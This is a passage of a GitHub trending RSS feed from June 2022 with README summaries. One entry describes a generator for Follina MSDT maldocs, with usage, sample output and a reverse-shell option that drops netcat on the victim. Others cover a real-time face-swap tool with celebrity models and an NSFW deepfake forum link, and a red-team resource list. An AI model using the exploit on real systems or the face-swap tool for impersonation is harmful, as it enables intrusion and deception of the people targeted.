<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub All Languages Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2022-06-03T01:29:53Z</updated>
  <subtitle>Daily Trending of All Languages in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>iperov/DeepFaceLive</title>
    <updated>2022-06-03T01:29:53Z</updated>
    <id>tag:github.com,2022-06-03:/iperov/DeepFaceLive</id>
    <link href="https://github.com/iperov/DeepFaceLive" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Real-time face swap for PC streaming or video calls&lt;/p&gt;&lt;hr&gt;&lt;table align=&#34;center&#34; border=&#34;0&#34;&gt; &#xA; &lt;tbody&gt;&#xA;  &lt;tr&gt;&#xA;   &lt;td colspan=&#34;2&#34; align=&#34;center&#34;&gt; &lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/iperov/DeepFaceLive/master/doc/deepfacelive_intro.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/iperov/DeepFaceLive/master/doc/logo_onnx.png&#34; alt=&#34;&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/iperov/DeepFaceLive/master/doc/logo_directx.png&#34; alt=&#34;&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/iperov/DeepFaceLive/master/doc/logo_python.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &lt;/td&gt;&#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt;&#xA;&lt;/table&gt; &#xA;&lt;table align=&#34;center&#34; border=&#34;0&#34;&gt; &#xA; &lt;tbody&gt;&#xA;  &lt;tr&gt;&#xA;   &lt;td colspan=&#34;2&#34; align=&#34;center&#34;&gt; &lt;h2&gt;Face Swapper&lt;/h2&gt; &lt;p&gt;You can swap your face from a webcam or the face in the video using trained face models.&lt;/p&gt; &lt;p&gt;Here is a list of available ready-to-use public face models.&lt;/p&gt; &lt;p&gt;These persons do not exists. Similarities with real people are accidental. Except Keanu Reeves. He exists, and he&#39;s breathtaking!&lt;/p&gt; &lt;/td&gt;&#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt;&#xA;   &lt;td colspan=&#34;2&#34; align=&#34;center&#34;&gt; &#xA;    &lt;table align=&#34;center&#34; border=&#34;0&#34;&gt; &#xA;     &lt;tbody&gt;&#xA;      &lt;tr&gt;&#xA;       &lt;td align=&#34;center&#34;&gt; Keanu Reeves &lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/iperov/DeepFaceLive/master/doc/celebs/Keanu_Reeves/Keanu_Reeves.png&#34; width=&#34;128&#34;&gt;&lt;/p&gt; &lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/iperov/DeepFaceLive/master/doc/celebs/Keanu_Reeves/examples.md&#34;&gt;examples&lt;/a&gt;&lt;/p&gt; &lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;     &lt;/tbody&gt;&#xA;    &lt;/table&gt; &#xA;    &lt;table align=&#34;center&#34; border=&#34;0&#34;&gt; &#xA;     &lt;tbody&gt;&#xA;      &lt;tr&gt;&#xA;       &lt;td align=&#34;center&#34;&gt; Ava de Addario &lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/iperov/DeepFaceLive/master/doc/celebs/Ava_de_Addario/Ava_de_Addario.png&#34; width=&#34;128&#34;&gt;&lt;/p&gt; &lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/iperov/DeepFaceLive/master/doc/celebs/Ava_de_Addario/examples.md&#34;&gt;examples&lt;/a&gt;&lt;/p&gt; &lt;/td&gt;&#xA;       &lt;td align=&#34;center&#34;&gt; Dilraba Dilmurat &lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/iperov/DeepFaceLive/master/doc/celebs/Dilraba_Dilmurat/Dilraba_Dilmurat.png&#34; width=&#34;128&#34;&gt;&lt;/p&gt; &lt;p&gt;examples&lt;/p&gt; &lt;/td&gt;&#xA;       &lt;td align=&#34;center&#34;&gt; Ewon Spice &lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/iperov/DeepFaceLive/master/doc/celebs/Ewon_Spice/Ewon_Spice.png&#34; width=&#34;128&#34;&gt;&lt;/p&gt; &lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/iperov/DeepFaceLive/master/doc/celebs/Ewon_Spice/examples.md&#34;&gt;examples&lt;/a&gt;&lt;/p&gt; &lt;/td&gt;&#xA;       &lt;td align=&#34;center&#34;&gt; Yohanna Coralson &lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/iperov/DeepFaceLive/master/doc/celebs/Yohanna_Coralson/Yohanna_Coralson.png&#34; width=&#34;128&#34;&gt;&lt;/p&gt; &lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/iperov/DeepFaceLive/master/doc/celebs/Yohanna_Coralson/examples.md&#34;&gt;examples&lt;/a&gt;&lt;/p&gt; &lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;     &lt;/tbody&gt;&#xA;    &lt;/table&gt; &#xA;    &lt;table align=&#34;center&#34; border=&#34;0&#34;&gt; &#xA;     &lt;tbody&gt;&#xA;      &lt;tr align=&#34;center&#34;&gt;&#xA;       &lt;td align=&#34;center&#34;&gt; Kim Jarrey &lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/iperov/DeepFaceLive/master/doc/celebs/Kim_Jarrey/Kim_Jarrey.png&#34; width=&#34;128&#34;&gt;&lt;/p&gt; &lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/iperov/DeepFaceLive/master/doc/celebs/Kim_Jarrey/examples.md&#34;&gt;examples&lt;/a&gt;&lt;/p&gt; &lt;/td&gt;&#xA;       &lt;td&gt; David Kovalniy &lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/iperov/DeepFaceLive/master/doc/celebs/David_Kovalniy/David_Kovalniy.png&#34; width=&#34;128&#34;&gt;&lt;/p&gt; &lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/iperov/DeepFaceLive/master/doc/celebs/David_Kovalniy/examples.md&#34;&gt;examples&lt;/a&gt;&lt;/p&gt; &lt;/td&gt;&#xA;       &lt;td&gt; Matilda Bobbie &lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/iperov/DeepFaceLive/master/doc/celebs/Matilda_Bobbie/Matilda_Bobbie.png&#34; width=&#34;128&#34;&gt;&lt;/p&gt; &lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/iperov/DeepFaceLive/master/doc/celebs/Matilda_Bobbie/examples.md&#34;&gt;examples&lt;/a&gt;&lt;/p&gt; &lt;/td&gt;&#xA;       &lt;td&gt; Bryan Greynolds &lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/iperov/DeepFaceLive/master/doc/celebs/Bryan_Greynolds/Bryan_Greynolds.png&#34; width=&#34;128&#34;&gt;&lt;/p&gt; &lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/iperov/DeepFaceLive/master/doc/celebs/Bryan_Greynolds/examples.md&#34;&gt;examples&lt;/a&gt;&lt;/p&gt; &lt;/td&gt;&#xA;       &lt;td&gt; Nicola Badge &lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/iperov/DeepFaceLive/master/doc/celebs/Nicola_Badge/Nicola_Badge.png&#34; width=&#34;128&#34;&gt;&lt;/p&gt; &lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/iperov/DeepFaceLive/master/doc/celebs/Nicola_Badge/examples.md&#34;&gt;examples&lt;/a&gt;&lt;/p&gt; &lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;     &lt;/tbody&gt;&#xA;    &lt;/table&gt; &#xA;    &lt;table align=&#34;center&#34; border=&#34;0&#34;&gt; &#xA;     &lt;tbody&gt;&#xA;      &lt;tr align=&#34;center&#34;&gt;&#xA;       &lt;td align=&#34;center&#34;&gt; Silwan Stillwone &lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/iperov/DeepFaceLive/master/doc/celebs/Silwan_Stillwone/Silwan_Stillwone.png&#34; width=&#34;128&#34;&gt;&lt;/p&gt; &lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/iperov/DeepFaceLive/master/doc/celebs/Silwan_Stillwone/examples.md&#34;&gt;examples&lt;/a&gt;&lt;/p&gt; &lt;/td&gt;&#xA;       &lt;td&gt; Tim Chrys &lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/iperov/DeepFaceLive/master/doc/celebs/Tim_Chrys/Tim_Chrys.png&#34; width=&#34;128&#34;&gt;&lt;/p&gt; &lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/iperov/DeepFaceLive/master/doc/celebs/Tim_Chrys/examples.md&#34;&gt;examples&lt;/a&gt;&lt;/p&gt; &lt;/td&gt;&#xA;       &lt;td&gt; Zahar Lupin &lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/iperov/DeepFaceLive/master/doc/celebs/Zahar_Lupin/Zahar_Lupin.png&#34; width=&#34;128&#34;&gt;&lt;/p&gt; &lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/iperov/DeepFaceLive/master/doc/celebs/Zahar_Lupin/examples.md&#34;&gt;examples&lt;/a&gt;&lt;/p&gt; &lt;/td&gt;&#xA;       &lt;td&gt; Tim Norland &lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/iperov/DeepFaceLive/master/doc/celebs/Tim_Norland/Tim_Norland.png&#34; width=&#34;128&#34;&gt;&lt;/p&gt; &lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/iperov/DeepFaceLive/master/doc/celebs/Tim_Norland/examples.md&#34;&gt;examples&lt;/a&gt;&lt;/p&gt; &lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;     &lt;/tbody&gt;&#xA;    &lt;/table&gt; &lt;/td&gt;&#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt;&#xA;   &lt;td colspan=&#34;2&#34; align=&#34;center&#34;&gt; If you want a higher quality or better face match, you can train your own face model using &lt;a href=&#34;https://github.com/iperov/DeepFaceLab&#34;&gt;DeepFaceLab&lt;/a&gt; &lt;p&gt;Here is an &lt;a href=&#34;https://www.tiktok.com/@arnoldschwarzneggar/video/6995538782204300545&#34;&gt;example&lt;/a&gt; of Arnold Schwarzneggar trained on a particular face and used in a video call. Read the FAQ for more information.&lt;/p&gt; &lt;/td&gt;&#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt;&#xA;&lt;/table&gt; &#xA;&lt;table align=&#34;center&#34; border=&#34;0&#34;&gt; &#xA; &lt;tbody&gt;&#xA;  &lt;tr&gt;&#xA;   &lt;td colspan=&#34;2&#34; align=&#34;center&#34;&gt; &lt;h2&gt;Face Animator&lt;/h2&gt; &lt;p&gt;There is also a Face Animator module in DeepFaceLive app. You can control a static face picture using video or your own face from the camera. The quality is not the best, and requires fine face matching and tuning parameters for every face pair, but enough for funny videos and memes or real-time streaming at 25 fps using 35 TFLOPS GPU.&lt;/p&gt; &lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/iperov/DeepFaceLive/master/doc/face_animator_example.gif&#34;&gt;&lt;/p&gt; &lt;p&gt;Here is a &lt;a href=&#34;https://raw.githubusercontent.com/iperov/DeepFaceLive/master/doc/FaceAnimator_tutor.webm?raw=true&#34;&gt;mini video&lt;/a&gt; showing the process of setting up the Face Animator for Obama controlling Kim Chen&#39;s face.&lt;/p&gt; &lt;/td&gt;&#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt;&#xA;&lt;/table&gt; &#xA;&lt;table align=&#34;center&#34; border=&#34;0&#34;&gt; &#xA; &lt;tbody&gt;&#xA;  &lt;tr&gt;&#xA;   &lt;td colspan=&#34;2&#34; align=&#34;center&#34;&gt; &lt;h2&gt;System requirements&lt;/h2&gt; &lt;p&gt;any DirectX12 compatible graphics card&lt;/p&gt; &lt;p&gt;(Recommended RTX 2070+ / Radeon RX 5700 XT+ )&lt;/p&gt; &lt;p&gt;Modern CPU with AVX instructions&lt;/p&gt; &lt;p&gt;4GB RAM, 32GB+ paging file&lt;/p&gt; &lt;p&gt;Windows 10&lt;/p&gt; &lt;/td&gt;&#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt;&#xA;   &lt;td colspan=&#34;2&#34; align=&#34;center&#34;&gt; &lt;h2&gt;Setup tutorial&lt;/h2&gt; &lt;/td&gt;&#xA;  &lt;/tr&gt;&#xA;  &lt;tr&gt;&#xA;   &lt;td colspan=&#34;2&#34; align=&#34;center&#34;&gt; &lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/iperov/DeepFaceLive/master/doc/setup_tutorial_windows/index.md&#34;&gt;Windows 10 x64&lt;/a&gt;&lt;/p&gt; &lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/iperov/DeepFaceLive/master/build/linux&#34;&gt;Linux build info&lt;/a&gt;&lt;/p&gt; &lt;h2&gt;Documentation&lt;/h2&gt; &lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/iperov/DeepFaceLive/master/doc/user_faq/user_faq.md&#34;&gt;User FAQ&lt;/a&gt;&lt;/p&gt; &lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/iperov/DeepFaceLive/master/doc/developer_faq/developer_faq.md&#34;&gt;Developer FAQ&lt;/a&gt;&lt;/p&gt; &lt;/td&gt;&#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt;&#xA;   &lt;td colspan=&#34;2&#34; align=&#34;center&#34;&gt; &lt;h2&gt;Releases&lt;/h2&gt; &lt;/td&gt;&#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt;&#xA;   &lt;td align=&#34;right&#34;&gt; &lt;p&gt;&lt;a href=&#34;https://disk.yandex.ru/d/7i5XTKIKVg5UUg&#34;&gt;Windows 10 x64 (yandex.ru)&lt;/a&gt;&lt;/p&gt; &lt;p&gt;&lt;a href=&#34;https://mega.nz/folder/m10iELBK#Y0H6BflF9C4k_clYofC7yA&#34;&gt;Windows 10 x64 (mega.nz)&lt;/a&gt;&lt;/p&gt; &lt;/td&gt;&#xA;   &lt;td align=&#34;left&#34;&gt; Contains stand-alone zero-dependency all-in-one ready-to-use portable self-extracting folder! You don&#39;t need to install anything other than video drivers. &lt;br&gt;&lt;br&gt; DirectX12 build : NVIDIA, AMD, Intel videocards. &lt;br&gt;&lt;br&gt; NVIDIA build : NVIDIA cards only, GT730 and higher. Works faster than DX12. FaceMerger can work also on AMD/Intel. &lt;/td&gt;&#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt;&#xA;   &lt;td colspan=&#34;2&#34; align=&#34;center&#34;&gt; &lt;h2&gt;Communication groups&lt;/h2&gt; &lt;/td&gt;&#xA;  &lt;/tr&gt;&#xA;  &lt;tr&gt;&#xA;   &lt;td align=&#34;right&#34;&gt; &lt;a href=&#34;https://discord.gg/S2h7kPySQp&#34;&gt;Discord&lt;/a&gt; &lt;/td&gt;&#xA;   &lt;td align=&#34;left&#34;&gt;Official discord channel. English / Russian.&lt;/td&gt;&#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt;&#xA;   &lt;td align=&#34;right&#34;&gt; &lt;a href=&#34;https://mrdeepfakes.com/forums/&#34;&gt;mrdeepfakes&lt;/a&gt; &lt;/td&gt;&#xA;   &lt;td align=&#34;left&#34;&gt;the biggest NSFW English deepfake community&lt;/td&gt;&#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt;&#xA;   &lt;td align=&#34;right&#34;&gt; &lt;a href=&#34;https://www.dfldata.xyz&#34;&gt;dfldata.xyz&lt;/a&gt; &lt;/td&gt;&#xA;   &lt;td align=&#34;left&#34;&gt;中文交流论坛，免费软件教程、模型、人脸数据&lt;/td&gt;&#xA;  &lt;/tr&gt;  &#xA;  &lt;tr&gt;&#xA;   &lt;td colspan=&#34;2&#34; align=&#34;center&#34;&gt; &lt;h2&gt;How can I help the project?&lt;/h2&gt; &lt;/td&gt;&#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt;&#xA;   &lt;td colspan=&#34;2&#34; align=&#34;center&#34;&gt; I need the computing power to train models. &lt;br&gt; If you have a free computer with 2080TI or better card with 12GB+ VRAM, you can give me remote access to it. I will train 1 model in a month. Contact me(iperov#6528) in Discord channel. &lt;/td&gt;&#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt;&#xA;   &lt;td colspan=&#34;2&#34; align=&#34;center&#34;&gt; Register github account and push &#34;Star&#34; button. &lt;/td&gt;&#xA;  &lt;/tr&gt; &#xA;  &lt;!--&lt;tr&gt;&lt;td colspan=2 align=&#34;center&#34;&gt;&#xA;&lt;a href=&#34;https://www.paypal.com/paypalme/DeepFaceLab&#34;&gt;Donate via Paypal&lt;/a&gt;&#xA;&lt;/td&gt;&lt;/tr&gt;--&gt; &#xA;  &lt;tr&gt;&#xA;   &lt;td colspan=&#34;2&#34; align=&#34;center&#34;&gt; &lt;a href=&#34;https://money.yandex.ru/to/41001142318065&#34;&gt;Donate via Yandex.Money&lt;/a&gt; &lt;/td&gt;&#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt;&#xA;   &lt;td colspan=&#34;2&#34; align=&#34;center&#34;&gt; bitcoin:bc1qewl062v70rszulml3f0mjdjrys8uxdydw3v6rq &lt;/td&gt;&#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt;&#xA;   &lt;td colspan=&#34;2&#34; align=&#34;center&#34;&gt; &#xA;    &lt;!--&#xA;    &lt;a href=&#34;https://br-stone.online&#34;&gt;&lt;img src=&#34;doc/logo_barclay_stone.png&#34;&gt;&lt;/img&gt;&lt;/a&gt;&lt;a href=&#34;https://exmo.com&#34;&gt;&lt;img src=&#34;doc/logo_exmo.png&#34;&gt;&lt;/img&gt;&lt;/a&gt;&#xA;&#xA;    presents&#xA;&#xA;    &lt;tr&gt;&lt;td align=&#34;right&#34;&gt;&#xA;&#xA;&#xA;    &lt;a href=&#34;&#34;&gt;Windows (magnet link)&lt;/a&gt;&#xA;    &lt;/td&gt;&lt;td align=&#34;center&#34;&gt;Latest release. Use torrent client to download.&lt;/td&gt;&lt;/tr&gt;&#xA;    &lt;/tr&gt;&#xA;--&gt; &lt;/td&gt;&#xA;  &lt;/tr&gt;&#xA; &lt;/tbody&gt;&#xA;&lt;/table&gt;</summary>
  </entry>
  <entry>
    <title>JohnHammond/msdt-follina</title>
    <updated>2022-06-03T01:29:53Z</updated>
    <id>tag:github.com,2022-06-03:/JohnHammond/msdt-follina</id>
    <link href="https://github.com/JohnHammond/msdt-follina" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Codebase to generate an msdt-follina payload&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;MS-MSDT &#34;Follina&#34; Attack Vector&lt;/h1&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;John Hammond | May 30, 2022&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;Create a &#34;Follina&#34; MS-MSDT attack with a malicious Microsoft Word document and stage a payload with an HTTP server.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/6288722/171033876-dbe73e3e-0a3a-436a-91d8-7fa77a5c1ace.png&#34; alt=&#34;Screenshot&#34;&gt;&lt;/p&gt; &#xA;&lt;h1&gt;Usage&lt;/h1&gt; &#xA;&lt;pre&gt;&lt;code&gt;usage: follina.py [-h] [--command COMMAND] [--output OUTPUT] [--interface INTERFACE] [--port PORT]&#xA;&#xA;options:&#xA;  -h, --help            show this help message and exit&#xA;  --command COMMAND, -c COMMAND&#xA;                        command to run on the target (default: calc)&#xA;  --output OUTPUT, -o OUTPUT&#xA;                        output maldoc file (default: ./follina.doc)&#xA;  --interface INTERFACE, -i INTERFACE&#xA;                        network interface or IP address to host the HTTP server (default: eth0)&#xA;  --port PORT, -p PORT  port to serve the HTTP server (default: 8000)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h1&gt;Examples&lt;/h1&gt; &#xA;&lt;p&gt;Pop &lt;code&gt;calc.exe&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ python3 follina.py   &#xA;[+] copied staging doc /tmp/9mcvbrwo&#xA;[+] created maldoc ./follina.doc&#xA;[+] serving html payload on :8000&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Pop &lt;code&gt;notepad.exe&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ python3 follina.py -c &#34;notepad&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Get a reverse shell on port 9001. &lt;strong&gt;Note, this downloads a netcat binary &lt;em&gt;onto the victim&lt;/em&gt; and places it in &lt;code&gt;C:\Windows\Tasks&lt;/code&gt;. It does not clean up the binary. This will trigger antivirus detections unless AV is disabled.&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ python3 follina.py -r 9001&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/6288722/171037880-03a73d6a-4606-4c42-abcb-ee52a9e669c6.png&#34; alt=&#34;Reverse Shell&#34;&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>coderQuad/New-Grad-Positions-2023</title>
    <updated>2022-06-03T01:29:53Z</updated>
    <id>tag:github.com,2022-06-03:/coderQuad/New-Grad-Positions-2023</id>
    <link href="https://github.com/coderQuad/New-Grad-Positions-2023" rel="alternate"></link>
    <summary type="html">&lt;p&gt;A collection of New Grad full time roles in SWE, Quant, and PM.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;2023 New Grad Applications&lt;/h1&gt; &#xA;&lt;p&gt;The 2023 Full time grind has begun! Use this repo to share and keep track of any full time positions in quant, SWE, and PM.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Contribute by making a pull request!&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Resources&lt;/h2&gt; &#xA;&lt;p&gt;Here are some resources Coder Quad recommends to prepare for OA&#39;s and technical interviews!&lt;/p&gt; &#xA;&lt;h4&gt;Books&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://cses.fi/book/book.pdf&#34;&gt;Competitive Programmer&#39;s Handbook&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;The List&lt;/h2&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Name&lt;/th&gt; &#xA;   &lt;th&gt;Location&lt;/th&gt; &#xA;   &lt;th&gt;Notes&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://akunacapital.com/careers?experience=junior&amp;amp;department=development#careers&#34;&gt;Akuna Capital&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Chicago&lt;/td&gt; &#xA;   &lt;td&gt;Various Junior Developer Positions&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt;</summary>
  </entry>
  <entry>
    <title>Threekiii/Awesome-Redteam</title>
    <updated>2022-06-03T01:29:53Z</updated>
    <id>tag:github.com,2022-06-03:/Threekiii/Awesome-Redteam</id>
    <link href="https://github.com/Threekiii/Awesome-Redteam" rel="alternate"></link>
    <summary type="html">&lt;p&gt;一个红队知识仓库&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Awesome-Redteam&lt;/h1&gt; &#xA;&lt;p&gt;&lt;strong&gt;【免责声明】本仓库所涉及的技术、思路和工具仅供学习，任何人不得将其用于非法用途和盈利，否则后果自行承担。&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;轻量化红队知识仓库，不定期更新。markdown文档与Linux alias命令或Windows doskey命令联动，可实现终端快捷查询。&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;近期在复现免杀（涵盖msf、evasion、veil、venom、shellter等）：&lt;/strong&gt;&lt;a href=&#34;https://github.com/Threekiii/Awesome-Redteam/raw/master/tips/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%85%8D%E6%9D%80.md&#34;&gt;Click Here&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;攻防渗透中的常用命令（涵盖信息收集/漏洞挖掘/内网穿透/msf/cs等知识点）：&lt;/strong&gt;&lt;a href=&#34;https://github.com/Threekiii/Awesome-Redteam/raw/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md&#34;&gt;Click Here&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;长期维护一个综合漏洞知识库（涵盖Vulhub、Peiqi、Edge、0sec、Wooyun等开源漏洞库）：&lt;/strong&gt;&lt;a href=&#34;https://github.com/Threekiii/Vulnerability-Wiki&#34;&gt;Threekiii/Vulnerability-Wiki&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;长期维护一个漏洞利用工具库（涵盖Vulhub、Peiqi等开源漏洞库）：&lt;/strong&gt;&lt;a href=&#34;https://github.com/Threekiii/Awesome-Exploit&#34;&gt;Threekiii/Awesome-Exploit&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;目录&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#awesome-redteam&#34;&gt;Awesome-Redteam&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E7%9B%AE%E5%BD%95&#34;&gt;目录&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93&#34;&gt;漏洞知识库&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E9%A1%B9%E7%9B%AE%E5%AF%BC%E8%88%AA&#34;&gt;项目导航&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E9%80%9F%E6%9F%A5%E6%96%87%E6%A1%A3-CheatSheets&#34;&gt;速查文档-CheatSheets&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E4%B8%80%E4%BA%9B%E4%BB%A3%E7%A0%81-Scripts&#34;&gt;一些代码-Scripts&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E6%94%BB%E9%98%B2%E7%9F%A5%E8%AF%86-Tips&#34;&gt;攻防知识-Tips&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E6%9C%8D%E5%8A%A1%E6%90%AD%E5%BB%BA-Docs&#34;&gt;服务搭建-Docs&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E5%BC%80%E6%BA%90%E5%AF%BC%E8%88%AA&#34;&gt;开源导航&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E7%BC%96%E8%A7%A3%E7%A0%81%E5%8A%A0%E8%A7%A3%E5%AF%86&#34;&gt;编解码/加解密&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E5%AE%9E%E7%94%A8%E5%B7%A5%E5%85%B7&#34;&gt;实用工具&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5&#34;&gt;威胁情报&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%90%9C%E7%B4%A2&#34;&gt;网络空间搜索&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Threekiii/Awesome-Redteam/master/#%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93&#34;&gt;公开知识库&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a 